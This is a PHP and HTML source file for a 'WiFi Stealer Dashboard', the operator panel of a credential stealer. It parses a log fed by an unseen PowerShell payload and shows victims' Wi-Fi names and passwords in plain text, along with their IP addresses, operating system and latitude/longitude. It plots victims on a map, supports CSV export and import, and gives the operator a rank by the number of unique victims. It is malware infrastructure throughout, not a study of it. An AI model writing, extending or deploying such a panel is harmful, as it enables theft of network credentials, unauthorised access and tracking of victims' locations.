<?php
date_default_timezone_set('Asia/Kolkata');

$logFile = __DIR__ . '/wifi_creds.log';

/**
 * Parse a single CSV capture line into a normalized array.
 *
 * CSV order (must match PowerShell payload):
 *  0: Timestamp
 *  1: Victim ID
 *  2: SSID
 *  3: Password
 *  4: Victim LAN IP
 *  5: Victim OS
 *  6: Public IP
 *  7: LAN IP extra detail (altitude)
 *  8: Latitude
 *  9: Longitude
 * 10: Packet summary
 */
function parse_capture_line($line)
{
    $line = trim($line);
    if ($line === '') {
        return null;
    }

    $fields = str_getcsv($line);
    if (count($fields) < 5) {
        return null;
    }

    $timeStr     = trim($fields[0] ?? '');
    $victimId    = trim($fields[1] ?? '');
    $ssid        = trim($fields[2] ?? '');
    $pass        = trim($fields[3] ?? '');
    $victimLanIp = trim($fields[4] ?? '');
    $victimOs    = trim($fields[5] ?? '');
    $publicIp    = trim($fields[6] ?? '');
    $lanIpExtra  = trim($fields[7] ?? '');
    $latitude    = trim($fields[8] ?? '');
    $longitude   = trim($fields[9] ?? '');
    $pktSummary  = trim($fields[10] ?? '');

    // Filter out header/garbage rows
    $badSsids = ['profile_name', 'ssid', 'SSID', 'IP', 'OS', 'Pass', 'password'];
    if ($ssid === '' || in_array($ssid, $badSsids, true) || in_array($pass, ['Pass', 'password'], true)) {
        return null;
    }

    if ($pass === '') {
        $pass = '(Not Found)';
    }

    // Normalize/beautify time
    $timestampRaw = $timeStr !== '' ? $timeStr : 'unknown';
    $timestampPretty = $timestampRaw;
    if ($timestampRaw !== 'unknown') {
        $ts = strtotime($timestampRaw);
        if ($ts !== false) {
            // Example: "12 May 2026, 01:50 PM"
            $timestampPretty = date('d M Y, h:i A', $ts);
        }
    }

    $passLength   = strlen($pass);
    $allLetters   = ($pass !== '' && ctype_alpha($pass));
    $allNumbers   = ($pass !== '' && ctype_digit($pass));
    $weakPassword = ($passLength < 8 || $allLetters || $allNumbers);

    return [
        'time_raw'     => $timestampRaw,
        'time'         => $timestampPretty,
        'victim_id'    => $victimId !== '' ? $victimId : 'unknown',
        'ssid'         => $ssid,
        'password'     => $pass,
        'len'          => $passLength,
        'weak'         => $weakPassword,
        'ip_main'      => $victimLanIp !== '' ? $victimLanIp : 'offline',
        'os'           => $victimOs !== '' ? $victimOs : 'unknown',
        'public_ip'    => $publicIp !== '' ? $publicIp : 'unknown',
        'lan_ip_extra' => $lanIpExtra !== '' ? $lanIpExtra : 'N/A',
        'latitude'     => $latitude !== '' ? $latitude : 'N/A',
        'longitude'    => $longitude !== '' ? $longitude : 'N/A',
        'pkt_summary'  => $pktSummary !== '' ? $pktSummary : 'N/A',
    ];
}

/** Safe HTML escape. */
function h($v)
{
    return htmlspecialchars((string)$v, ENT_QUOTES, 'UTF-8');
}

/** Simple OS detection from user agent (viewer info only). */
function detectOS($userAgent) {
    $ua = strtolower($userAgent);

    if (strpos($ua, 'windows') !== false) return 'Windows';
    if (strpos($ua, 'android') !== false) return 'Android';
    if (strpos($ua, 'iphone') !== false || strpos($ua, 'ipad') !== false || strpos($ua, 'ios') !== false) {
        return 'iOS';
    }
    if (strpos($ua, 'mac os') !== false || strpos($ua, 'macintosh') !== false) return 'macOS';
    if (strpos($ua, 'linux') !== false) return 'Linux';

    return 'Unknown';
}

// --- 1. CSV EXPORT ---
if (isset($_GET['action']) && $_GET['action'] === 'export_csv') {
    if (!file_exists($logFile)) {
        die('No data to export.');
    }

    $rawLines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (empty($rawLines)) {
        die('No captures to export.');
    }

    $records = [];
    foreach ($rawLines as $rawLine) {
        $entry = parse_capture_line($rawLine);
        if ($entry === null) {
            continue;
        }
        $records[] = [
            $entry['time_raw'],
            $entry['victim_id'],
            $entry['ssid'],
            $entry['password'],
            $entry['ip_main'],
            $entry['os'],
            $entry['public_ip'],
            $entry['lan_ip_extra'],
            $entry['latitude'],
            $entry['longitude'],
            $entry['pkt_summary'],
        ];
    }

    if (empty($records)) {
        die('No valid captures to export.');
    }

    $filename = 'wifi_captures_' . date('Ymd_Hi') . '.csv';
    header('Content-Type: text/csv; charset=utf-8');
    header('Content-Disposition: attachment; filename="' . $filename . '"');
    $fp = fopen('php://output', 'w');

    fputcsv($fp, [
        'Time',
        'Victim ID',
        'SSID',
        'Password',
        'Victim LAN IP',
        'Victim OS',
        'Public IP',
        'LAN extra',
        'Latitude',
        'Longitude',
        'Packet summary'
    ]);

    foreach ($records as $row) {
        fputcsv($fp, $row);
    }

    fclose($fp);
    exit;
}

// --- 2. CSV IMPORT ---
$importStatus = null;
if (isset($_POST['action']) && $_POST['action'] === 'import_csv') {
    if (!isset($_FILES['csv_file']) || $_FILES['csv_file']['error'] !== UPLOAD_ERR_OK) {
        $importStatus = 'Error: No file uploaded or upload failed.';
    } else {
        $tmpName = $_FILES['csv_file']['tmp_name'];
        if (!is_uploaded_file($tmpName)) {
            $importStatus = 'Invalid upload.';
        } else {
            $fp = fopen($tmpName, 'r');
            if (!$fp) {
                $importStatus = 'Cannot read uploaded file.';
            } else {
                $addedCount = 0;
                while (($fields = fgetcsv($fp, 0, ',', '"', '\\')) !== false) {
                    if (count($fields) >= 5) {
                        $line = '"' . implode('","', array_map('trim', $fields)) . '"' . PHP_EOL;
                        file_put_contents($logFile, $line, FILE_APPEND | LOCK_EX);
                        $addedCount++;
                    }
                }
                fclose($fp);
                $importStatus = "Imported $addedCount captures from CSV.";
            }
        }
    }
}

// --- 3. Clear all entries ---
if (isset($_POST['action']) && $_POST['action'] === 'clear_all') {
    if (file_exists($logFile)) {
        $handle = fopen($logFile, 'w');
        if ($handle) {
            fclose($handle);
        }
    }
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// --- 4. Delete single entry ---
if (isset($_POST['action']) && $_POST['action'] === 'delete_one') {
    $index = isset($_POST['idx']) ? intval($_POST['idx']) : -1;

    if (file_exists($logFile) && $index >= 0) {
        $fileLines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        if (isset($fileLines[$index])) {
            unset($fileLines[$index]);
            file_put_contents($logFile, implode(PHP_EOL, $fileLines) . PHP_EOL);
        }
    }
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// --- 5. Viewer info ---
$viewerIP = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$viewerUA = $_SERVER['HTTP_USER_AGENT'] ?? '';
$viewerOS = detectOS($viewerUA);

// --- 6. Read and parse captures ---
$rawLines = [];
if (file_exists($logFile)) {
    $rawLines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
}

$captureEntries = [];
foreach ($rawLines as $idx => $rawLine) {
    $entry = parse_capture_line($rawLine);
    if ($entry === null) {
        continue;
    }
    $entry['log_index'] = $idx; // keep original file index
    $captureEntries[] = $entry;
}

// Sort latest first by raw timestamp if possible
usort($captureEntries, function ($a, $b) {
    $ta = strtotime($a['time_raw']);
    $tb = strtotime($b['time_raw']);
    if ($ta === false && $tb === false) return 0;
    if ($ta === false) return 1;
    if ($tb === false) return -1;
    // newest first
    return $tb <=> $ta;
});

// Re-index display idx after sorting
foreach ($captureEntries as $i => &$entry) {
    $entry['idx'] = $i;
}
unset($entry);

// --- 7. Stats + unique set for rank ---

$totalCaptures       = count($captureEntries); // all rows
$ssidCount           = [];
$ipCount             = [];
$totalPasswordLength = 0;
$weakPasswords       = 0;

// For rank: only count unique by victim+ssid+lat+lon
$uniqueKeySetForRank = [];

foreach ($captureEntries as $entry) {
    if ($entry['ssid'] !== '') {
        $ssidCount[$entry['ssid']] = ($ssidCount[$entry['ssid']] ?? 0) + 1;
    }
    if ($entry['ip_main'] !== 'offline') {
        $ipCount[$entry['ip_main']] = ($ipCount[$entry['ip_main']] ?? 0) + 1;
    }

    $totalPasswordLength += $entry['len'];
    if ($entry['weak']) {
        $weakPasswords++;
    }

    $rankKey = $entry['victim_id'] . '|' . $entry['ssid'] . '|' . $entry['latitude'] . '|' . $entry['longitude'];
    $uniqueKeySetForRank[$rankKey] = true;
}

$uniqueSSIDs     = count($ssidCount);
$uniqueIPs       = count($ipCount);
$avgPasswordLen  = $totalCaptures > 0 ? round($totalPasswordLength / $totalCaptures, 1) : 0;
$weakPercentage  = $totalCaptures > 0 ? round(($weakPasswords / $totalCaptures) * 100, 1) : 0.0;

$uniqueRankCount = count($uniqueKeySetForRank);

// --- 8. Filters from query ---
$filter_ssid    = isset($_GET['ssid'])  ? trim($_GET['ssid'])  : '';
$filter_ip      = isset($_GET['ip'])    ? trim($_GET['ip'])    : '';
$filter_os_f    = isset($_GET['os'])    ? trim($_GET['os'])    : '';
$filter_victim  = isset($_GET['vid'])   ? trim($_GET['vid'])   : '';

$filteredEntries = [];
foreach ($captureEntries as $entry) {
    if ($filter_ssid !== '' && stripos($entry['ssid'], $filter_ssid) === false) {
        continue;
    }
    if ($filter_ip !== '' &&
        stripos($entry['ip_main'], $filter_ip) === false &&
        stripos($entry['public_ip'], $filter_ip) === false) {
        continue;
    }
    if ($filter_os_f !== '' && stripos($entry['os'], $filter_os_f) === false) {
        continue;
    }
    if ($filter_victim !== '' && stripos($entry['victim_id'], $filter_victim) === false) {
        continue;
    }
    $filteredEntries[] = $entry;
}

// --- 9. Map markers + hotspot ---

$markers = [];
$locationBuckets = []; // "lat,lon" => count (for filtered list)

foreach ($filteredEntries as $entry) {
    $lat = $entry['latitude'];
    $lon = $entry['longitude'];

    if ($lat !== 'N/A' && $lon !== 'N/A') {
        $key = $lat . ',' . $lon;
        $locationBuckets[$key] = ($locationBuckets[$key] ?? 0) + 1;

        $markers[] = [
            'lat'       => (float)$lat,
            'lon'       => (float)$lon,
            'ssid'      => $entry['ssid'],
            'victim_id' => $entry['victim_id'],
            'time'      => $entry['time'],
        ];
    }
}

// Hotspot
$hotspotLabel = 'None';
$hotspotCount = 0;
if (!empty($locationBuckets)) {
    arsort($locationBuckets);
    $topKey   = array_key_first($locationBuckets);
    $hotspotCount = $locationBuckets[$topKey];
    $hotspotLabel = $topKey . ' (' . $hotspotCount . ' captures)';
}

// --- 10. Rank based on unique captures ---
if ($uniqueRankCount <= 10) {
    $rankName  = 'Rookie';
    $rankPct   = ($uniqueRankCount / 10) * 25;
} elseif ($uniqueRankCount <= 30) {
    $rankName  = 'Intermediate';
    $rankPct   = 25 + (($uniqueRankCount - 10) / 20) * 25;
} elseif ($uniqueRankCount <= 100) {
    $rankName  = 'Advanced';
    $rankPct   = 50 + (($uniqueRankCount - 30) / 70) * 25;
} else {
    $rankName  = 'Expert';
    $rankPct   = 75 + min(25, ($uniqueRankCount - 100) * 0.25);
}
$rankPct = round(min(100, max(5, $rankPct)), 1);

// --- 11. Build JS data for details + map ---
$jsDetails = [];
foreach ($filteredEntries as $entry) {
    $jsDetails[] = [
        'victim_id'  => $entry['victim_id'],
        'ip_main'    => $entry['ip_main'],
        'public_ip'  => $entry['public_ip'],
        'latitude'   => $entry['latitude'],
        'longitude'  => $entry['longitude'],
        'os'         => $entry['os'],
    ];
}

$jsMarkers       = $markers;
$jsRankName      = $rankName;
$jsRankPct       = $rankPct;
$jsHotspotLabel  = $hotspotLabel;
$jsTotalCaptures = $uniqueRankCount; // show unique count in rank text

$viewMode = 'basic';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>WiFi Stealer Dashboard</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- Leaflet CSS -->
    <link
      rel="stylesheet"
      href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"
      integrity="sha256-p4NxAoJBhI+u1Lk9wP1U1zP4PaIBbQxX3A6Z5x3oE04="
      crossorigin=""
    />
    <!-- Leaflet JS -->
    <script
      src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"
      integrity="sha256-o9N1j7kCzorZ8M8J3t8C0FqkQ9O9Y6N0wLZ9Z8a5QDY="
      crossorigin=""
    ></script>
    <style>
        body {
            margin: 0;
            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
            background: radial-gradient(circle at top left, #0f172a 0, #020617 40%, #000 100%);
            color: #e5e7eb;
        }
        .page {
            max-width: 1100px;
            margin: 0 auto;
            padding: 16px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            gap: 16px;
        }
        .page-header {
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            justify-content: space-between;
            gap: 12px;
        }
        .title-group {
            display: flex;
            flex-direction: column;
            gap: 4px;
        }
        .title {
            font-size: 22px;
            font-weight: 600;
        }
        .subtitle {
            font-size: 12px;
            color: #9ca3af;
        }
        .viewer-meta {
            font-size: 11px;
            color: #9ca3af;
        }
        .actions {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            align-items: center;
        }
        .btn {
            font-size: 12px;
            border-radius: 999px;
            padding: 6px 12px;
            border: 1px solid rgba(148,163,184,0.5);
            background: linear-gradient(135deg, rgba(15,23,42,0.95), rgba(15,23,42,0.6));
            color: #e5e7eb;
            cursor: pointer;
            text-decoration: none;
        }
        .btn:hover {
            border-color: #4f46e5;
            box-shadow: 0 0 0 1px rgba(79,70,229,0.5);
        }
        .btn-danger {
            border-color: rgba(248,113,113,0.7);
            color: #fecaca;
            background: linear-gradient(135deg, rgba(127,29,29,0.9), rgba(127,29,29,0.6));
        }
        .btn-danger:hover {
            box-shadow: 0 0 0 1px rgba(248,113,113,0.7);
        }
        .btn-sm {
            padding: 4px 8px;
            font-size: 11px;
        }
        .upload-form {
            display: inline-flex;
            align-items: center;
            gap: 6px;
        }
        .upload-form input[type="file"] {
            font-size: 11px;
            max-width: 180px;
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
            gap: 12px;
        }
        .stat-card {
            background: #0f172a;
            border-radius: 10px;
            padding: 10px 12px;
            border: 1px solid rgba(148,163,184,0.25);
        }
        .stat-label {
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 0.08em;
            color: #9ca3af;
        }
        .stat-value {
            margin-top: 4px;
            font-size: 18px;
            font-weight: 600;
            color: #e5e7eb;
        }
        .card {
            background: rgba(15,23,42,0.95);
            border-radius: 12px;
            border: 1px solid rgba(148,163,184,0.3);
            box-shadow: 0 22px 45px rgba(15,23,42,0.7);
            padding: 12px 14px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 12px;
        }
        th, td {
            padding: 6px 8px;
            border-bottom: 1px solid rgba(55,65,81,0.8);
            text-align: left;
            vertical-align: top;
        }
        th {
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 0.08em;
            color: #9ca3af;
            background: radial-gradient(circle at top left, rgba(79,70,229,0.25), transparent 60%);
        }
        tr:hover {
            background: rgba(31,41,55,0.7);
        }
        .badge {
            display: inline-block;
            border-radius: 999px;
            padding: 2px 6px;
            font-size: 10px;
        }
        .badge-weak {
            background: rgba(248,113,113,0.18);
            color: #fecaca;
        }
        .badge-ok {
            background: rgba(74,222,128,0.18);
            color: #bbf7d0;
        }
        .password {
            font-family: "JetBrains Mono", ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
        }
        .footer {
            margin-top: auto;
            font-size: 11px;
            color: #6b7280;
            text-align: center;
            padding-top: 8px;
            border-top: 1px solid rgba(31,41,55,0.9);
        }
        .status {
            font-size: 12px;
            margin-top: 4px;
        }
        .status-ok {
            color: #bbf7d0;
        }
        .status-error {
            color: #fecaca;
        }
        @media (max-width: 768px) {
            table, thead, tbody, th, td, tr {
                display: block;
            }
            thead {
                display: none;
            }
            tr {
                margin-bottom: 10px;
            }
            td {
                border: none;
                padding: 4px 6px;
            }
        }
    </style>
    <script>
        var autoRefresh   = false;
        var refreshTimer  = null;
        var REFRESH_INTERVAL = 10000;

        window.captureDetails = <?php echo json_encode($jsDetails); ?>;
        window.captureMarkers = <?php echo json_encode($jsMarkers); ?>;
        window.rankName       = <?php echo json_encode($jsRankName); ?>;
        window.rankPct        = <?php echo json_encode($jsRankPct); ?>;
        window.hotspotLabel   = <?php echo json_encode($jsHotspotLabel); ?>;
        window.totalCaptures  = <?php echo json_encode($jsTotalCaptures); ?>;

        var mapInstance = null;

        function toggleAutoRefresh(enabled) {
            autoRefresh = enabled;
            if (refreshTimer) {
                clearInterval(refreshTimer);
                refreshTimer = null;
            }
            var toggleBtn = document.getElementById('auto-refresh-toggle');
            if (autoRefresh) {
                refreshTimer = setInterval(function() {
                    window.location.reload();
                }, REFRESH_INTERVAL);
                if (toggleBtn) toggleBtn.innerText = 'Auto-refresh: ON';
                if (window.localStorage) localStorage.setItem('wifi_dashboard_auto_refresh', 'on');
            } else {
                if (toggleBtn) toggleBtn.innerText = 'Auto-refresh: OFF';
                if (window.localStorage) localStorage.setItem('wifi_dashboard_auto_refresh', 'off');
            }
        }

        document.addEventListener('DOMContentLoaded', function() {
            var savedPreference = window.localStorage ? localStorage.getItem('wifi_dashboard_auto_refresh') : null;
            if (savedPreference === 'on' || savedPreference === null) {
                toggleAutoRefresh(true);
            } else {
                toggleAutoRefresh(false);
            }

            var rankLabelEl = document.getElementById('rank-label');
            var rankPctEl   = document.getElementById('rank-pct');
            var rankBarEl   = document.getElementById('rank-bar');
            if (rankLabelEl && rankPctEl && rankBarEl) {
                rankLabelEl.textContent = window.rankName + ' (' + window.totalCaptures + ' unique captures)';
                rankPctEl.textContent   = window.rankPct + '%';
                rankBarEl.style.width   = window.rankPct + '%';
            }
        });

        function showDetails(idx) {
            idx = parseInt(idx, 10);
            var row = window.captureDetails[idx];
            if (!row) return;

            var box = document.getElementById('details-box');
            var content = document.getElementById('details-content');
            var title = document.getElementById('details-title');

            title.textContent = 'Details of capture #' + (idx + 1);

            var html = '';
            html += '<div><strong>Victim ID:</strong> ' + row.victim_id + '</div>';
            html += '<div><strong>Victim LAN IP:</strong> ' + row.ip_main + '</div>';
            html += '<div><strong>Public IP:</strong> ' + row.public_ip + '</div>';
            html += '<div><strong>Location:</strong> ' + row.latitude + ', ' + row.longitude + '</div>';
            html += '<div><strong>OS:</strong> ' + row.os + '</div>';

            content.innerHTML = html;
            box.style.display = 'block';
        }

        function hideDetails() {
            var box = document.getElementById('details-box');
            box.style.display = 'none';
        }

        function showCapturesMap() {
            var box = document.getElementById('captures-box');
            if (!box) return;

            // make visible before creating map
            box.style.display = 'block';

            var mapDiv = document.getElementById('captures-map');
            if (!mapDiv) return;

            // destroy old map if exists
            if (mapInstance) {
                mapInstance.remove();
                mapInstance = null;
            }

            var markers = window.captureMarkers || [];
            var defaultLat = 20.5937;
            var defaultLon = 78.9629;
            var defaultZoom = 4;

            if (markers.length > 0) {
                defaultLat = markers[0].lat;
                defaultLon = markers[0].lon;
                defaultZoom = 5;
            }

            mapInstance = L.map('captures-map').setView([defaultLat, defaultLon], defaultZoom);

            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                maxZoom: 18,
                attribution: '&copy; OpenStreetMap contributors'
            }).addTo(mapInstance);

            var bounds = [];
            markers.forEach(function(m) {
                if (!m.lat || !m.lon || isNaN(m.lat) || isNaN(m.lon)) return;
                var marker = L.marker([m.lat, m.lon]).addTo(mapInstance);
                marker.bindPopup(
                    '<b>Victim:</b> ' + m.victim_id + '<br/>' +
                    '<b>SSID:</b> ' + m.ssid + '<br/>' +
                    '<b>Time:</b> ' + m.time
                );
                bounds.push([m.lat, m.lon]);
            });

            if (bounds.length > 1) {
                mapInstance.fitBounds(bounds, { padding: [20, 20] });
            } else if (bounds.length === 1) {
                mapInstance.setView(bounds[0], 12);
            }

            setTimeout(function() {
                mapInstance.invalidateSize();
            }, 100);
        }

        function hideCapturesMap() {
            var box = document.getElementById('captures-box');
            if (box) box.style.display = 'none';

            if (mapInstance) {
                mapInstance.remove();
                mapInstance = null;
            }
        }
    </script>
</head>
<body>
<div class="page">
    <div class="page-header">
        <div class="title-group">
            <div class="title">WiFi Stealer Dashboard</div>
            <div class="subtitle">
                Captures: <?php echo h($totalCaptures); ?> • Timezone: IST
            </div>
            <div class="viewer-meta">
                You are viewing from IP <?php echo h($viewerIP); ?> on <?php echo h($viewerOS); ?>
            </div>
        </div>
        <div class="actions">
            <a href="?action=export_csv" class="btn">Export CSV</a>

            <!-- Upload CSV button -->
            <form class="upload-form" method="post" enctype="multipart/form-data">
                <input type="hidden" name="action" value="import_csv">
                <input type="file" name="csv_file" accept=".csv" required>
                <button type="submit" class="btn btn-sm">Upload CSV</button>
            </form>

            <button type="button" class="btn" id="auto-refresh-toggle"
                    onclick="toggleAutoRefresh(!autoRefresh);">
                Auto-refresh: OFF
            </button>

            <button type="button" class="btn" onclick="showCapturesMap();">
                Captures map
            </button>

            <form method="post"
                  onsubmit="return confirm('Delete ALL history? This cannot be undone.');"
                  style="display:inline;">
                <input type="hidden" name="action" value="clear_all">
                <button type="submit" class="btn btn-danger">
                    Clear all history
                </button>
            </form>
        </div>
    </div>

    <?php if ($importStatus !== null): ?>
        <div class="status <?php echo strpos($importStatus, 'Error') === 0 ? 'status-error' : 'status-ok'; ?>">
            <?php echo h($importStatus); ?>
        </div>
    <?php endif; ?>

    <!-- FILTERS -->
    <div class="card">
        <form method="get" style="display:flex; flex-wrap:wrap; gap:8px; align-items:center; margin-bottom:4px;">
            <input type="text" name="vid" placeholder="Filter Victim ID"
                   value="<?php echo h($filter_victim); ?>"
                   style="padding:4px 8px; font-size:12px; border-radius:6px; border:1px solid #4b5563; background:#020617; color:#e5e7eb;">
            <input type="text" name="ssid" placeholder="Filter SSID"
                   value="<?php echo h($filter_ssid); ?>"
                   style="padding:4px 8px; font-size:12px; border-radius:6px; border:1px solid #4b5563; background:#020617; color:#e5e7eb;">
            <input type="text" name="ip" placeholder="Filter IP (LAN/Public)"
                   value="<?php echo h($filter_ip); ?>"
                   style="padding:4px 8px; font-size:12px; border-radius:6px; border:1px solid #4b5563; background:#020617; color:#e5e7eb;">
            <input type="text" name="os" placeholder="Filter OS"
                   value="<?php echo h($filter_os_f); ?>"
                   style="padding:4px 8px; font-size:12px; border-radius:6px; border:1px solid #4b5563; background:#020617; color:#e5e7eb;">
            <button type="submit" class="btn btn-sm">Apply filters</button>
            <a href="<?php echo h($_SERVER['PHP_SELF']); ?>" class="btn btn-sm">Clear</a>
        </form>
    </div>

    <div class="stats-grid">
        <div class="stat-card">
            <div class="stat-label">Total captures</div>
            <div class="stat-value"><?php echo h($totalCaptures); ?></div>
        </div>
        <div class="stat-card">
            <div class="stat-label">Unique SSIDs</div>
            <div class="stat-value"><?php echo h($uniqueSSIDs); ?></div>
        </div>
        <div class="stat-card">
            <div class="stat-label">Source IPs</div>
            <div class="stat-value"><?php echo h($uniqueIPs); ?></div>
        </div>
        <div class="stat-card">
            <div class="stat-label">Avg password length</div>
            <div class="stat-value"><?php echo h($avgPasswordLen); ?></div>
        </div>
        <div class="stat-card">
            <div class="stat-label">Weak passwords</div>
            <div class="stat-value"><?php echo h($weakPercentage); ?>%</div>
        </div>
        <div class="stat-card">
            <div class="stat-label">Rank</div>
            <div class="stat-value" id="rank-label"></div>
            <div style="margin-top:6px; background:#020617; border-radius:999px; overflow:hidden; height:8px;">
                <div id="rank-bar"
                     style="height:100%; width:0%; background:linear-gradient(90deg,#22c55e,#eab308,#f97316);">
                </div>
            </div>
            <div id="rank-pct" style="font-size:11px; margin-top:3px; color:#9ca3af;"></div>
        </div>
    </div>

    <div class="card">
        <table>
            <thead>
            <tr>
                <th>#</th>
                <th>Victim</th>
                <th>Time</th>
                <th>SSID</th>
                <th>Password</th>
                <th>Len</th>
                <th>Strength</th>
                <th>Actions</th>
            </tr>
            </thead>
            <tbody>
            <?php if (empty($filteredEntries)): ?>
                <tr>
                    <td colspan="8" style="text-align:center; padding:12px; color:#9ca3af;">
                        No captures yet.
                    </td>
                </tr>
            <?php else: ?>
                <?php foreach ($filteredEntries as $entry): ?>
                    <tr>
                        <td><?php echo h($entry['idx'] + 1); ?></td>
                        <td><?php echo h($entry['victim_id']); ?></td>
                        <td><?php echo h($entry['time']); ?></td>
                        <td><?php echo h($entry['ssid']); ?></td>
                        <td class="password"><?php echo h($entry['password']); ?></td>
                        <td><?php echo h($entry['len']); ?></td>
                        <td>
                            <?php if ($entry['weak']): ?>
                                <span class="badge badge-weak">weak</span>
                            <?php else: ?>
                                <span class="badge badge-ok">ok</span>
                            <?php endif; ?>
                        </td>
                        <td>
                            <button type="button"
                                    class="btn btn-sm"
                                    onclick="showDetails('<?php echo h($entry['idx']); ?>');">
                                Details
                            </button>

                            <form method="post"
                                  style="display:inline;"
                                  onsubmit="return confirm('Delete this entry?');">
                                <input type="hidden" name="action" value="delete_one">
                                <input type="hidden" name="idx" value="<?php echo h($entry['log_index']); ?>">
                                <button type="submit" class="btn btn-sm btn-danger">Delete</button>
                            </form>
                        </td>
                    </tr>
                <?php endforeach; ?>
            <?php endif; ?>
            </tbody>
        </table>
    </div>

    <div id="details-box" class="card" style="margin-top:12px; display:none;">
        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:6px;">
            <div id="details-title" style="font-weight:600; font-size:14px;">Details of capture</div>
            <button type="button" class="btn btn-sm btn-danger" onclick="hideDetails();">Close</button>
        </div>
        <div id="details-content" style="font-size:12px; line-height:1.6;"></div>
    </div>

    <div id="captures-box" class="card" style="margin-top:12px; display:none;">
        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:6px;">
            <div style="font-weight:600; font-size:14px;">
                Captures map – hotspot: <?php echo h($hotspotLabel); ?>
            </div>
            <button type="button" class="btn btn-sm btn-danger" onclick="hideCapturesMap();">Close</button>
        </div>
        <div id="captures-map" style="width:100%; height:360px; border-radius:10px; overflow:hidden;"></div>
        <div style="font-size:11px; color:#9ca3af; margin-top:4px;">
            Markers show each capture location (based on recorded latitude/longitude).
        </div>
    </div>

    <div class="footer">
        © 2026 WiFi Stealer Dashboard – Made By Zypher17
    </div>
</div>
</body>
</html>
